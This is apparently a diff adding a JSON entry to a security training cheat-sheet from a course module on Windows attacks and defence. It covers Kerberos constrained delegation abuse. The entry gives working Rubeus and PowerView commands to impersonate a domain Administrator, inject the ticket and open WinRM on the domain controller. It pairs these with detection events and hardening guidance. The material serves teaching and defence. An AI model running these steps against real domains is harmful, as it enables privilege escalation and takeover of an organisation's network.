@@ -1,0 +1,98 @@
+{
+  "id": "cdsa-m06-constrained-delegation",
+  "name": "Kerberos Constrained Delegation Abuse (S4U)",
+  "command": ".\\Rubeus.exe s4u /user:<DELEGATE_USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /impersonateuser:Administrator /msdsspn:\"http/<DC_HOSTNAME>\" /dc:<DC_FQDN> /ptt",
+  "description": "Kerberos Constrained Delegation allows a service account to request tickets on behalf of any user to specific services. Attackers with control of a delegated account can impersonate Domain Admins to those services (e.g., HTTP\u2192WinRM\u2192DC). Detection: Event 4624 with 'Transited Services' attribute showing S4U delegation chain. Prevention: mark privileged users as 'Account is sensitive and cannot be delegated', add to Protected Users group.",
+  "platform": "windows",
+  "type": "attack-chain",
+  "opsec": "quiet",
+  "category": "Active Directory Defense",
+  "subcategory": "Kerberos Attacks",
+  "certifications": [
+    "CDSA"
+  ],
+  "source": "CDSA Module 06: Windows Attacks & Defense",
+  "tags": [
+    "constrained-delegation",
+    "s4u",
+    "kerberos",
+    "rubeus",
+    "impersonation",
+    "winrm",
+    "active-directory",
+    "blue-team"
+  ],
+  "mitre": [
+    "T1558.003",
+    "T1134.001"
+  ],
+  "notes": "Three types of Kerberos delegation:\n  \u2192 Unconstrained: can delegate to ANY service\n  \u2192 Constrained: can delegate to SPECIFIC services (configured in user properties)\n  \u2192 Resource-based: computer object says who can delegate TO it\n\nLab: webservice account is trusted to delegate HTTP to DC1 (eagle.local)\nThis means: webservice can get tickets for ANY user on http/DC1\nHTTP \u2192 enables PowerShell Remoting (WinRM)\n\n=== ATTACK ===\n# Step 1: Find accounts trusted for constrained delegation (PowerView)\n# Note: use PowerView-main.ps1 for -TrustedToAuth parameter\n. .\\PowerView-main.ps1\nGet-NetUser -TrustedToAuth\n  \u2192 Look for: msds-allowedtodelegateto, useraccountcontrol: TRUSTED_TO_AUTH_FOR_DELEGATION\n\n# Step 2: Convert plaintext password to NTLM hash (Rubeus)\n.\\Rubeus.exe hash /password:<PASSWORD>\n  \u2192 Copy rc4_hmac value\n\n# Step 3: S4U \u2014 get ticket for Administrator impersonating webservice\n.\\Rubeus.exe s4u /user:<DELEGATE_USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /impersonateuser:Administrator /msdsspn:\"http/<DC_HOSTNAME>\" /dc:<DC_FQDN> /ptt\n\n  Arguments:\n    /user:           the account trusted for delegation (e.g., webservice)\n    /rc4:            NTLM hash of the delegating account\n    /impersonateuser: the user to impersonate (Administrator)\n    /msdsspn:        target service SPN (must be in msds-allowedtodelegateto)\n    /dc:             domain controller FQDN\n    /ptt:            inject ticket into current session\n\n  Protocol transition note: if trusted for LDAP, can request ticket for ANY service\n    e.g., /altservice:ldap,cifs,host,http \u2014 add /altservice for other protocols\n\n# Step 4: Verify ticket\nklist\n  \u2192 Client: Administrator @ DOMAIN, Server: http/<DC>\n\n# Step 5: Connect to DC as Administrator via WinRM\nEnter-PSSession <DC_HOSTNAME>\n  \u2192 hostname, whoami to confirm\n\n# If connection fails: klist purge \u2192 repeat S4U \u2192 retry\nklist purge\n\n=== DETECTION ===\nEvent 4624: Successful logon\n  \u2192 'Transited Services' field = <service_account>@<DOMAIN>\n  \u2192 This field is populated when S4U logon is used\n  \u2192 Normally empty for regular logons\n  \u2192 Alert: Administrator logon with non-empty Transited Services from unexpected IP\n\n=== PREVENTION ===\n  \u2192 Check 'Account is sensitive and cannot be delegated' for all privileged accounts\n  \u2192 Add privileged users to 'Protected Users' group (auto-applies cannot-delegate)\n  \u2192 Treat delegated accounts as highly privileged regardless of their AD role\n  \u2192 Use 100+ char passwords for all delegated service accounts",
+  "examples": [
+    {
+      "label": "Find accounts trusted for constrained delegation (PowerView)",
+      "command": "Get-NetUser -TrustedToAuth"
+    },
+    {
+      "label": "Convert plaintext password to NTLM hash",
+      "command": ".\\Rubeus.exe hash /password:<PASSWORD>"
+    },
+    {
+      "label": "S4U \u2014 impersonate Administrator via constrained delegation",
+      "command": ".\\Rubeus.exe s4u /user:<DELEGATE_USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /impersonateuser:Administrator /msdsspn:\"http/<DC_HOSTNAME>\" /dc:<DC_FQDN> /ptt"
+    },
+    {
+      "label": "S4U with alternate service protocols",
+      "command": ".\\Rubeus.exe s4u /user:<DELEGATE_USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /impersonateuser:Administrator /msdsspn:\"http/<DC_HOSTNAME>\" /altservice:ldap,cifs,host /dc:<DC_FQDN> /ptt"
+    },
+    {
+      "label": "Verify injected ticket",
+      "command": "klist"
+    },
+    {
+      "label": "Connect to DC via WinRM using injected ticket",
+      "command": "Enter-PSSession <DC_HOSTNAME>"
+    },
+    {
+      "label": "Purge tickets and retry if connection fails",
+      "command": "klist purge"
+    }
+  ],
+  "references": [
+    {
+      "title": "HTB Academy - Windows Attacks & Defense",
+      "url": "https://academy.hackthebox.com/module/details/176"
+    },
+    {
+      "title": "Microsoft - Protected Users Security Group",
+      "url": "https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cdsa-m06-coercing-unconstrained-delegation",
+      "rel": "next",
+      "note": "Unconstrained delegation \u2014 broader attack that captures any TGT that connects."
+    },
+    {
+      "id": "cdsa-m06-dcsync",
+      "rel": "next",
+      "note": "After obtaining DC access via delegation, DCSync for full credential dump."
+    }
+  ],
+  "defense": {
+    "why_it_works": "Kerberos Constrained Delegation lets a service account request tickets on behalf of any user (S4U) to the specific services listed in msDS-AllowedToDelegateTo. Control of a delegated account therefore allows impersonating a Domain Admin to those services.",
+    "prerequisites": "Control of (or the NTLM hash of) an account configured for constrained delegation, plus knowledge of the allowed target SPN.",
+    "impact": "A service ticket as any user (e.g., Administrator) to the delegated service \u2014 e.g., HTTP on the DC, which enables WinRM/PowerShell Remoting and hands-on-keyboard access as that user.",
+    "detection": "Event 4624 (successful logon) whose 'Transited Services' field is populated with the service account \u2014 this field is normally empty and only fills for S4U logons. Alert on an Administrator logon with a non-empty Transited Services from an unexpected IP.",
+    "artifacts": "4624 events carrying Transited Services; Rubeus s4u execution and an injected ticket (klist shows client Administrator, server http/DC).",
+    "prevention": "Set 'Account is sensitive and cannot be delegated' on all privileged accounts; add privileged users to the Protected Users group; treat any delegated account as highly privileged and give it a 100+ char password.",
+    "evasion": "Protocol transition: an account trusted for LDAP delegation can request tickets for other services via /altservice (cifs, host, http), broadening access beyond the single configured SPN.",
+    "sources": [
+      "HTB CDSA M06",
+      "MITRE T1558.003"
+    ],
+    "misconfiguration": "An account has constrained delegation configured (msDS-AllowedToDelegateTo) but the 'Use any authentication protocol' (protocol transition) option is enabled. This allows the account to impersonate ANY user \u2014 including Domain Admins \u2014 to the listed services, without requiring the user's TGT. Combined with S4U2Self (service for user to self), an attacker who compromises this account can forge service tickets for privileged users.",
+    "vulnerable_config": "# Accounts with constrained delegation + protocol transition:\nGet-ADUser -Filter {msDS-AllowedToDelegateTo -ne '$null'} \\\n    -Properties TrustedToAuthForDelegation, 'msDS-AllowedToDelegateTo' |\n    Where-Object {$_.TrustedToAuthForDelegation -eq $true}\n\n# TrustedToAuthForDelegation = True means 'Use any auth protocol' is checked\n# This allows S4U2Self (impersonate any user) + S4U2Proxy (delegate to target service)",
+    "secure_config": "# Use 'Use Kerberos only' delegation (not protocol transition):\n# In ADUC: Account tab -> uncheck 'Trust this computer for delegation to specified services only'\n# -> choose 'Use Kerberos only' not 'Use any authentication protocol'\n\n# Set-ADUser svc_web -TrustedToAuthForDelegation $false\n\n# Use Resource-Based Constrained Delegation (RBCD) instead:\n# More granular \u2014 controlled by the resource, not the delegating account\n\n# Audit delegation rights quarterly:\nGet-ADUser -Filter {TrustedToAuthForDelegation -eq $true} |\n    Select-Object SamAccountName, 'msDS-AllowedToDelegateTo'\n\n# Add highly privileged accounts to Protected Users (blocks all delegation)"
+  }
+}
